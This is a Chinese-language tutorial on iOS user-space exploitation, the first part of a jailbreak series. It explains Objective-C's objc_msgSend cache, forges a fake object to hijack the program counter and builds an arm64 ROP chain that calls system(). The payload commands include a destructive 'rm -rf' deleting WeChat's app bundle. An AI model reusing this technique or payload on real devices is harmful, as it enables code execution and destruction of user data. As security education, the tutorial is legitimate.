# iOS冰与火之歌 – Objective-C Pwn and iOS arm64 ROP

0x00 序
======

* * *

冰指的是用户态，火指的是内核态。如何突破像冰箱一样的用户态沙盒最终到达并控制如火焰一般燃烧的内核就是《iOS冰与火之歌》这一系列文章将要讲述的内容。目录如下：

1.  Objective-C Pwn and iOS arm64 ROP
2.  █████████████
3.  █████████████
4.  █████████████
5.  █████████████

另外文中涉及代码可在我的github下载:  
[https://github.com/zhengmin1989/iOS_ICE_AND_FIRE](https://github.com/zhengmin1989/iOS_ICE_AND_FIRE)

0x01 什么是Objective-C
===================

* * *

Objective-C是扩充C的面向对象编程语言。语法和C非常像，但实现的机制却和java非常像。我们先来看一个简单的Hello，World程序了解一下。

```
Talker.h:
#import <Foundation/Foundation.h>
@interface Talker : NSObject
- (void) say: (NSString*) phrase;
@end

Talker.m:
#import "Talker.h"
@implementation Talker
- (void) say: (NSString*) phrase {
  NSLog(@"%@n", phrase);
}
@end

hello.m:
int main(void) {    
  Talker *talker = [[Talker alloc] init];
  [talker say: @"Hello, Ice and Fire!"];
  [talker say: @"Hello, Ice and Fire!"];
  [talker release];
}

```

因为测试机是ipad mini 4，这里我们只编译一个arm64版本的hello。我们先make一下，然后我们用scp把hello传到我们的ipad上面，然后尝试运行一下：

![p1](http://drops.javaweb.org/uploads/images/c73a51e51fb4df357b48e90a4c13bfc354a240f1.jpg)

如果我们能够看到”Hello, Ice and Fire!”，那么我们的第一个Objective-C程序就完成了。

0x02 Objc_msgSend
=================

* * *

我们接下来看一下用ida对hello进行反汇编后的结果：

![p2](http://drops.javaweb.org/uploads/images/398693ef9e15217fbc3d9740cf9aa1cabceb47dd.jpg)

我们发现程序中充满了`objc_msgSend()`这个函数。这个函数可以说是Objective-C的灵魂函数。在Objective-C中，message与方法的真正实现是在执行阶段绑定的，而非编译阶段。编译器会将消息发送转换成对`objc_msgSend`方法的调用。

`objc_msgSend`方法含两个必要参数：receiver、方法名（即：selector）。比如如：

`[receiver message];`将被转换为：`objc_msgSend(receiver, selector);`

另外每个对象都有一个指向所属类的指针isa。通过该指针，对象可以找到它所属的类，也就找到了其全部父类，如下图所示：

![p3](http://drops.javaweb.org/uploads/images/f9a1fc204ad6a5987093b57bc9695e7ac2b4436d.jpg)

当向一个对象发送消息时，`objc_msgSend`方法根据对象的isa指针找到对象的类，然后在类的调度表（dispatch table）中查找selector。如果无法找到selector，`objc_msgSend`通过指向父类的指针找到父类，并在父类的调度表（dispatch table）中查找selector，以此类推直到NSObject类。一旦查找到selector，`objc_msgSend`方法根据调度表的内存地址调用该实现。通过这种方式，message与方法的真正实现在执行阶段才绑定。

为了保证消息发送与执行的效率，系统会将全部selector和使用过的方法的内存地址缓存起来。每个类都有一个独立的缓存，缓存包含有当前类自己的selector以及继承自父类的selector。查找调度表（dispatch table）前，消息发送系统首先检查receiver对象的缓存。缓存命中的情况下，消息发送（messaging）比直接调用方法（function call）只慢一点点。

其实关于`objc_msgSend`这个函数，Apple已经提供了源码  
(比如arm64版本：[http://www.opensource.apple.com/source/objc4/objc4-647/runtime/Messengers.subproj/objc-msg-arm64.s](http://www.opensource.apple.com/source/objc4/objc4-647/runtime/Messengers.subproj/objc-msg-arm64.s))

为了有更高的效率，objc_msgSend这个函数是用汇编实现的：

![p4](http://drops.javaweb.org/uploads/images/9e52f4712f6a9e22bd92639a503bb49afbe2bdba.jpg)

首先函数会检测传递进来的第一个对象是否为空，然后计算MASK。随后就会进入缓存函数去寻找是否有selector对应的缓存：

![p5](http://drops.javaweb.org/uploads/images/dfaede3eb25615958cb6e1279e7c8d90fa96f8a9.jpg)

如果这个selector曾经被调用过，那么在缓存中就会保存这个selector对应的函数地址，如果这个函数再一次被调用，`objc_msgSend()`会直接跳转到缓存的函数地址。

但正因为这个机制，如果我们可以伪造一个receiver对象的话，我们就可以构造一个缓存的selector的函数地址，随后`objc_msgSend()`就会跳转到我们伪造的缓存函数地址上，从而让我们可以控制PC指针。

0x03 动态调试Objc_msgSend
=====================

* * *

在我们讲如何伪造objc对象控制pc前，我们先分析一下运行时的`Objc_msgSend()`函数。这里我们用lldb进行调试。我们先在ipad上用debugserver启动hello这个程序：

```
Minde-iPad:/tmp root# debugserver *:1234 ./hello 
debugserver-@(#)PROGRAM:debugserver  PROJECT:debugserver-340.3.51.1
 for arm64.
Listening to port 1234 for a connection from *...
Got a connection, launched process ./hello (pid = 1546).

```

然后在自己的pc上用lldb进行远程连接：

```
lldb
(lldb) process connect connect://localhost:5555
2016-01-17 14:58:39.540 lldb[59738:4122180] Metadata.framework [Error]: couldn't get the client port
Process 1546 stopped
* thread #1: tid = 0x2b92f, 0x0000000120041000 dyld`_dyld_start, stop reason = signal SIGSTOP
    frame #0: 0x0000000120041000 dyld`_dyld_start
dyld`_dyld_start:
->  0x120041000 <+0>:  mov    x28, sp
    0x120041004 <+4>:  and    sp, x28, #0xfffffffffffffff0
    0x120041008 <+8>:  movz   x0, #0
    0x12004100c <+12>: movz   x1, #0

```

接着我们可以在main函数那里设置一个断点：

```
(lldb) break set --name main
Breakpoint 1: no locations (pending).
WARNING:  Unable to resolve breakpoint to any actual locations.
(lldb) c
Process 1546 resuming
1 location added to breakpoint 1
7 locations added to breakpoint 1
Process 1546 stopped
* thread #1: tid = 0x2b92f, 0x0000000100063e48 hello`main, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000100063e48 hello`main
hello`main:
->  0x100063e48 <+0>:  stp    x22, x21, [sp, #-48]!
    0x100063e4c <+4>:  stp    x20, x19, [sp, #16]
    0x100063e50 <+8>:  stp    x29, x30, [sp, #32]
    0x100063e54 <+12>: add    x29, sp, #32

```

我们用disas反编译一下main函数：

![p6](http://drops.javaweb.org/uploads/images/081a0b3d32d2e511a08d30e589950c480068e8c8.jpg)

接下来我们在0x100063e94和0x100063ea4处下两个断点：

```
(lldb) b *0x100063e94
Breakpoint 2: where = hello`main + 76, address = 0x0000000100063e94
(lldb) b *0x100063ea4
Breakpoint 3: where = hello`main + 92, address = 0x0000000100063ea4

```

随后我们继续运行程序，然后用`po $x0`和`x/s $x1`可以看到receiver和selector的内容：

```
(lldb) c
Process 1546 resuming
Process 1546 stopped
* thread #1: tid = 0x2b92f, 0x0000000100063e94 hello`main + 76, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
    frame #0: 0x0000000100063e94 hello`main + 76
hello`main:
->  0x100063e94 <+76>: bl     0x100063f18               ; symbol stub for: objc_msgSend
    0x100063e98 <+80>: mov    x0, x19
    0x100063e9c <+84>: mov    x1, x20
    0x100063ea0 <+88>: mov    x2, x21
(lldb) po $x0
<Talker: 0x154604510>

(lldb) x/s $x1
0x100063f77: "say:"

```

这里可以看到receiver和selector分别为Talker和say。因此我们可以通过`po $x2`来知道say这个方法的参数的内容，也就是`“ Hello, Ice and Fire!”`：

```
(lldb) po $x2
Hello, Ice and Fire!

```

随后我们用si命令进入`objc_msgSend()`这个函数：

```
* thread #1: tid = 0x2b92f, 0x0000000199c1dbc0 libobjc.A.dylib`objc_msgSend, queue = 'com.apple.main-thread', stop reason = instruction step into
    frame #0: 0x0000000199c1dbc0 libobjc.A.dylib`objc_msgSend
libobjc.A.dylib`objc_msgSend:
->  0x199c1dbc0 <+0>:  cmp    x0, #0
    0x199c1dbc4 <+4>:  b.le   0x199c1dc2c               ; <+108>
    0x199c1dbc8 <+8>:  ldr    x13, [x0]
    0x199c1dbcc <+12>: and    x9, x13, #0x1fffffff8

```

我们接着使用disas来看一下objc_msgSend的汇编代码：

```
(lldb) disas
libobjc.A.dylib`objc_msgSend:
    0x199c1dbc0 <+0>:   cmp    x0, #0
->  0x199c1dbc4 <+4>:   b.le   0x199c1dc2c               ; <+108>
    0x199c1dbc8 <+8>:   ldr    x13, [x0]
    0x199c1dbcc <+12>:  and    x9, x13, #0x1fffffff8
    0x199c1dbd0 <+16>:  ldp    x10, x11, [x9, #16]
    0x199c1dbd4 <+20>:  and    w12, w1, w11
    0x199c1dbd8 <+24>:  add    x12, x10, x12, lsl #4
    0x199c1dbdc <+28>:  ldp    x16, x17, [x12]
    0x199c1dbe0 <+32>:  cmp    x16, x1
    0x199c1dbe4 <+36>:  b.ne   0x199c1dbec               ; <+44>
0x199c1dbe8 <+40>:  br     x17
    ……

```

可以看到`objc_msgSend`最开始做的事情就是从class的缓存中获取selector和对应的地址(`ldp x16, x17, [x12]`)，然后用缓存的selector和`objc_msgSend()`的selector进行比较(`cmp x16, x1`)，如果匹配的话就跳转到缓存的selector的地址上(`br x17`)。但由于我们是第一次执行`[talker say]`，缓存中并没有对应的函数地址，因此`objc_msgSend()`还要继续执行`_objc_msgSend_uncached_impcache`去类的方法列表里查找say这个函数的地址。

那么我们就继续执行程序，来看一下第二次调用say函数的话会怎么样。

```
(lldb) disas
libobjc.A.dylib`objc_msgSend:
    0x199c1dbc0 <+0>:   cmp    x0, #0
    0x199c1dbc4 <+4>:   b.le   0x199c1dc2c               ; <+108>
    0x199c1dbc8 <+8>:   ldr    x13, [x0]
    0x199c1dbcc <+12>:  and    x9, x13, #0x1fffffff8
    0x199c1dbd0 <+16>:  ldp    x10, x11, [x9, #16]
->  0x199c1dbd4 <+20>:  and    w12, w1, w11

```

当我们继续执行程序进入`objc_msgSend`后，在执行完"`ldp x10, x11, [x9, #16]`"这条指令后，`x10`会指向保存了缓存数据的地址。我们用`x/10gx $x10`来查看一下这个地址的数据，可以看到`init()`和`say()`这两个函数都已经被缓存了：

```
(lldb) x/10gx $x10

0x146502e10: 0x0000000000000000 0x0000000000000000
0x146502e20: 0x0000000000000000 0x0000000000000000
0x146502e30: 0x000000018b0f613e 0x0000000199c26a6c
0x146502e40: 0x0000000100053f37 0x0000000100053ea4
0x146502e50: 0x0000000000000004 0x000000019ccad6f8 

(lldb) x/s 0x000000018b0f613e
0x18b0f613e: "init"
(lldb) x/s 0x0000000100053f37
0x100053f37: "say:"

```

前一个数据是selector的地址，后一个数据就是selector对应的函数地址，比如say()这个函数：

```
(lldb) x/10i 0x0000000100053ea4
    0x100053ea4: 0xa9bf7bfd   stp    x29, x30, [sp, #-16]!
    0x100053ea8: 0x910003fd   mov    x29, sp
    0x100053eac: 0xd10043ff   sub    sp, sp, #16
    0x100053eb0: 0xf90003e2   str    x2, [sp]
    0x100053eb4: 0x10000fa0   adr    x0, #500                  ; @"%@n"
    0x100053eb8: 0xd503201f   nop    
    0x100053ebc: 0x94000004   bl     0x100053ecc               ; symbol stub for: NSLog
    0x100053ec0: 0x910003bf   mov    sp, x29
    0x100053ec4: 0xa8c17bfd   ldp    x29, x30, [sp], #16
    0x100053ec8: 0xd65f03c0   ret

```

0x04 伪造ObjC对象控制PC
=================

* * *

正如我之前提到的，如果我们可以伪造一个ObjC对象，然后构造一个假的cache的话，我们就有机会控制PC指针了。既然如此我们就来试一下吧。首先我们需要找到selector在内存中的地址，这个问题可以使用`NSSelectorFromString()`这个系统自带的API来解决，比如我们想知道”release”这个selector的地址，就可以使用`NSSelectorFromString(@"release")`来获取。

随后我们要构建一个假的`receiver`，假的`receiver`里有一个指向假的`objc_class`的指针，假的`objc_class`里又保存了假的`cache_buckets`的指针和`mask`。假的`cache_buckets`的指针最终指向我们将要伪造的`selector`和`selector`函数的地址：

```
struct fake_receiver_t
{
    uint64_t fake_objc_class_ptr;
}fake_receiver;

struct fake_objc_class_t {
    char pad[0x10];
    void* cache_buckets_ptr;
    uint32_t cache_bucket_mask;
} fake_objc_class;

struct fake_cache_bucket_t {
    void* cached_sel;
    void* cached_function;
} fake_cache_bucket;

```

接下来我们在main函数中尝试将talker这个receiver改成我们伪造的receiver，然后利用伪造的”release” selector来控制PC指向`0x41414141414141`这个地址：

```
int main(void) {

    Talker *talker = [[Talker alloc] init];
    [talker say: @"Hello, Ice and Fire!"];
    [talker say: @"Hello, Ice and Fire!"];
    [talker release];

    fake_cache_bucket.cached_sel = (void*) NSSelectorFromString(@"release");
    NSLog(@"cached_sel = %p", NSSelectorFromString(@"release"));

    fake_cache_bucket.cached_function = (void*)0x41414141414141;
    NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);

    fake_objc_class.cache_buckets_ptr = &fake_cache_bucket;
    fake_objc_class.cache_bucket_mask=0;

    fake_receiver.fake_objc_class_ptr=&fake_objc_class;
    talker= &fake_receiver;

    [talker release];
}

```

OK，接下来我们把新编译的hello传到我们的ipad上，然后用debugserver进行调试：

```
Minde-iPad:/tmp root# debugserver *:1234 ./hello 
debugserver-@(#)PROGRAM:debugserver  PROJECT:debugserver-340.3.51.1
 for arm64.
Listening to port 1234 for a connection from *...
Got a connection, launched process ./hello (pid = 1891).

```

然后我们用lldb进行连接，然后直接运行：

```
MacBookPro:objpwn zhengmin$ lldb
(lldb) process connect connect://localhost:5555
2016-01-17 22:02:45.681 lldb[61258:4325925] Metadata.framework [Error]: couldn't get the client port
Process 1891 stopped
* thread #1: tid = 0x36eff, 0x0000000120029000 dyld`_dyld_start, stop reason = signal SIGSTOP
    frame #0: 0x0000000120029000 dyld`_dyld_start
dyld`_dyld_start:
->  0x120029000 <+0>:  mov    x28, sp
    0x120029004 <+4>:  and    sp, x28, #0xfffffffffffffff0
    0x120029008 <+8>:  movz   x0, #0
    0x12002900c <+12>: movz   x1, #0
(lldb) c
Process 1891 resuming
2016-01-17 22:02:48.575 hello[1891:225023] Hello, Ice and Fire!
2016-01-17 22:02:48.580 hello[1891:225023] Hello, Ice and Fire!
2016-01-17 22:02:48.581 hello[1891:225023] cached_sel = 0x18b0f7191
2016-01-17 22:02:48.581 hello[1891:225023] fake_cache_bucket.cached_function = 0x41414141414141
Process 1891 stopped
* thread #1: tid = 0x36eff, 0x0041414141414141, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=257, address=0x41414141414141)
    frame #0: 0x0041414141414141
error: memory read failed for 0x41414141414000

```

可以看到我们成功的控制了PC，让PC指向了0x41414141414141。

0x05 iOS上的arm64 ROP
===================

* * *

虽然我们控制了PC，但在iOS上我们并不能采用`nmap()`或者`mprotect()`将内存改为可读可写可执行，如果我们想要让程序执行一些我们想要的指令的话必须要使用ROP。如果对于ROP不太了解的话，我推荐阅读一下我写的《一步一步学ROP》系列文章([http://drops.wooyun.org/papers/11390](http://drops.wooyun.org/papers/11390))

在各个系统中ROP的基本思路是一样的，这里我就简单介绍一下iOS上ROP的思路。

首先要知道的是，在iOS上默认是开启ASLR+DEP+PIE的。ASLR和DEP很好理解，PIE的意思是program image本身在内存中的地址也是随机的。所以我们在iOS上使用ROP技术必须配合信息泄露的漏洞才行。虽然在iOS上写ROP非常困难，但有个好消息是虽然program image是随机的，但是每个进程都会加载的`dyld_shared_cache`这个共享缓存的地址在开机后是固定的，并且每个进程的`dyld_shared_cache`都是相同的。这个`dyld_shared_cache`有好几百M大，基本上可以满足我们对gadgets的需求。因此我们只要在自己的进程获取`dyld_shared_cache`的基址就能够计算出目标进程gadgets的位置。

`dyld_shared_cache`文件一般保存在`/System/Library/Caches/com.apple.dyld/`这个目录下。我们下载下来以后就可以用ROPgadget这个工具来搜索gadget了。我们先实现一个简单的ROP，用`system()`函数执行”`touch /tmp/IceAndFire`”。因为我们`x0`是我们控制的`fake_receiver`的地址，因此我们可以搜索利用`x0`来控制其他寄存器的gadgets。比如下面这条：

```
ldr x1, [x0, #0x98] ; ldr x0, [x0, #0x70] ; cbz x1, #0xdcf9c ; br x1

```

随后我们可以构造一个假的结构体，然后给对应的寄存器赋值：

```
struct fake_receiver_t
{
    uint64_t fake_objc_class_ptr;
    uint8_t pad1[0x70-0x8];
    uint64_t x0;
    uint8_t pad2[0x98-0x70-0x8];
    uint64_t x1;
    char cmd[1024];
}fake_receiver;

fake_receiver.x0=(uint64_t)&fake_receiver.cmd;
fake_receiver.x1=(void *)dlsym(RTLD_DEFAULT, "system");
NSLog(@"system_address = %p", (void*)fake_receiver.x1);
strcpy(fake_receiver.cmd, "touch /tmp/IceAndFire");

```

最后我们将`cached_function`的值指向我们gagdet的地址就能控制程序执行`system()`指令了：

```
uint8_t* CoreFoundation_base = find_library_load_address("CoreFoundation");
NSLog(@"CoreFoundationbase address = %p", (void*)CoreFoundation_base);

//0x00000000000dcf7c  ldr x1, [x0, #0x98] ; ldr x0, [x0, #0x70] ; cbz x1, #0xdcf9c ; br x1
fake_cache_bucket.cached_function = (void*)CoreFoundation_base + 0x00000000000dcf7c;
NSLog(@"fake_cache_bucket.cached_function = %p", (void*)fake_cache_bucket.cached_function);

```

编译完后，我们将hello这个程序传输到iOS上测试一下：

![p7](http://drops.javaweb.org/uploads/images/25275fe00c2f10a1cba44ed06b638543acc4cd80.jpg)

发现`/tmp`目录下已经成功的创建了IceAndFire这个文件了。

有人觉得只是在tmp目录下touch一个文件并不过瘾，那么我们就尝试一下删除其他应用吧。应用的运行文件都保存在”`/var/mobile/Containers/Bundle/Application/`”目录下，比如微信的运行程序就在”`/var/mobile/Containers/Bundle/Application/ED6F728B-CC15-466B-942B-FBC4C534FF95/WeChat.app/WeChat`”下（注意ED6F728B-CC15-466B-942B-FBC4C534FF95这个值是在app安装时随机分配的）。于是我们将cmd指令换成：

```
strcpy(fake_receiver.cmd, "rm -rf /var/mobile/Containers/Bundle/Application/ED6F728B-CC15-466B-942B-FBC4C534FF95/");

```

然后再执行一下hello这个程序。程序运行后我们会发现微信的app图标还在，但当我们尝试打开微信的时候app就会秒退。这是因为虽然app被删了但springboard依然会有图标的缓存。这时候我们只要重启一下springboard或者手机就可以清空对应的图标的缓存了。这也就是为啥demo中的视频需要重启一下手机的原因：

0x06 总结
=======

* * *

这篇文章简单介绍了iOS上Objective-C 的利用以及iOS 上arm64 ROP，这些都是越狱需要掌握的最基本的知识。要注意的事，能做到执行system指令是因为我们是在越狱环境下以root身份运行了我们的程序，在非越狱模式下app是没有权限执行这些system指令的，想要做到这一点必须利用沙箱逃逸的漏洞才行，我们会在随后的文章中介绍这些过沙箱的技术，敬请期待。

另外，另外文中涉及代码可在我的github下载:

[https://github.com/zhengmin1989/iOS_ICE_AND_FIRE](https://github.com/zhengmin1989/iOS_ICE_AND_FIRE)

0x07 参考资料
=========

* * *

1.  Objective-C消息机制的原理[http://dangpu.sinaapp.com/?p=119](http://dangpu.sinaapp.com/?p=119)
2.  Abusing the Objective C runtime[http://phrack.org/issues/66/4.html](http://phrack.org/issues/66/4.html)